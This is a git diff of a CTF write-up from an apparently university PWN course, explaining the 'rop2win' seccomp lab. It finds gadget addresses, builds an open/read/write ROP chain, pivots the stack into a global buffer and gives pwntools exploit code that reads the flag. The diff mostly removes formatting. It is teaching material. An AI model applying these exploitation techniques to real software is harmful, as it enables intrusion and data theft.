@@ -1,12 +1,12 @@
 ---
-title: Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)
+title: Simple PWN - 0x10(seccomp/Lab - rop2win)
 tags: [CTF, PWN, eductf]
 
 category: "Security Course｜NTU CS｜PWN"
 date: 2023-01-29
 ---
 
-# Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)
+# Simple PWN - 0x10(seccomp/Lab - rop2win)
 <!-- more -->
 ###### tags: `CTF` `PWN` `eductf`
 
@@ -16,8 +16,7 @@ challenge: `nc edu-ctf.zoolab.org 10005`
 [Pwn week1](https://youtu.be/ktoVQB99Gj4?t=8457)
 
 ## Original Code
-:::spoiler
-```cpp!=
+```cpp
 #include <stdio.h>
 #include <unistd.h>
 #include <seccomp.h>
@@ -57,7 +56,7 @@ int main()
     return 0;
 }
 ```
-:::
+
 * You can observe that it just allow `open`, `read`, `write` system call, so our goal is <font color="FF0000">**read the flag in the server**</font> by using these allowable system call.
 * It has global variable so that we can write `ROP` chain in it.
 * You also can analyze the sample `ELF` file by `seccomp-tools` if there is no source code
@@ -93,6 +92,7 @@ int main()
 * According to [write(2) — Linux manual page](https://man7.org/linux/man-pages/man2/write.2.html)
     > write() writes up to count bytes from the buffer starting at `buf` to the file referred to by the file descriptor fd.
 * According to [Linux System Call Table for x86 64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
+
     |   %rax   | System Call |         %rdi          |           %rsi            |           %rdx            | %r10 | %r8 | %r9 |
     |:--------:|:-----------:|:---------------------:|:-------------------------:|:-------------------------:|:----:|:---:|:---:|
     |0|sys_read|unsigned int fd|char \*buf|size_t count||||
@@ -104,22 +104,22 @@ int main()
 
 ## Exploit - `ROP` + stack pivoting
 1. Find the address of global variable that is `fn` and `ROP`
-    ```bash!
+    ```bash
     $ objdump -d -M Intel chal | grep "<fn>"
     40189c: 48 8d 05 9d 1a 0e 00    lea 0xe1a9d(%rip),%rax # 4e3340 <fn>
     $ objdump -d -M Intel chal | grep "<ROP>"
     4018c9: 48 8d 05 90 1a 0e 00    lea 0xe1a90(%rip),%rax # 4e3360 <ROP>
     ```
-    ```python!
+    ```python
     fn = 0x4e3340
     ROP_addr = 0x4e3360
     ```
 2. Find `ROP` gadget address
-    ```bash!
+    ```bash
     $ ROPgadget --binary chal --multibr --only "pop|syscall|ret|leave" > one_gadget
     $ vim one_gadget
     ```
-    ```python!
+    ```python
     pop_rax_ret = 0x45db87
     pop_rdi_ret = 0x4038b3
     pop_rsi_ret = 0x402428
@@ -128,7 +128,7 @@ int main()
     leave_ret = 0x40190c
     ```
 3. Construct `ROP` chain
-    ```python!
+    ```python
     ROP = flat(
        # Open filename
        # fd = open("flag", 0);
@@ -154,25 +154,24 @@ int main()
        )
     ```
 4. Write `ROP` chain to global variable(a new stack)
-    ```python!
+    ```python
     r.sendafter("Give me ROP:", b'a'*0x8 + ROP)
     ```
     * Note that, you must try and error to observe how many bytes you have to overlap by trash such as `b'a'*0x8`
 5. Stack pivoting
-    ```python!
+    ```python
     r.sendafter('Give me overflow:', b'a'*0x20 + p64(ROP_addr) + p64(leave_ret))
     ```
     * Note that, you must try and error to observe how many bytes you have to overlap by trash such as `b'a'*0x20`
 6. Where is the flag file in remote server?
 You can build the docker and observe the relative position → `/home/chal/flag`
-    ```python!
+    ```python
     r.sendafter("Give me filename:", '/home/chal/flag\x00')
     ```
 7. Then we got flag!!!
     ![](https://imgur.com/DdvxfZy.png)
 * Whole exploit
-    :::spoiler code
-    ```python=
+    ```python
     from pwn import *
 
     #r = process('./chal')
@@ -216,6 +215,5 @@ You can build the docker and observe the relative position → `/home/chal/flag`
 
     r.interactive()
     ```
-    :::
 # Reference 
 [Linux 核心設計: 檔案系統概念及實作手法 (上)](https://youtu.be/d8ZN5-XTIJM)
